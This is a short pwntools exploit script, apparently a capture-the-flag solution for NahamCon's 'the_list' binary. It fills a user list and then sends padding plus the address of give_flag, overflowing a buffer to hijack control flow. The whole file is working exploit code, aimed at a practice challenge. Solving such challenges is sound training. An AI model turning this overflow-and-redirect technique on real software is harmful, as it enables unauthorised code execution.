#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./the_list')

if args.REMOTE:
	p = remote('challenge.nahamcon.com', 31980)
else:
	p = process(binary.path)
	libc = binary.libc

p.sendlineafter('name: ','blah')

for i in range(0x248 // 0x20 - 1):
	log.info('adding user: ' + str(i+1))
	p.sendlineafter('> ','2')
	p.sendlineafter('name: ',b'A')

payload  = b''
payload += 8 * b'A'
payload += p64(binary.sym.give_flag)

p.sendlineafter('> ','2')
p.sendlineafter('name: ',payload)
p.sendlineafter('> ','5')
p.stream()
p.close()
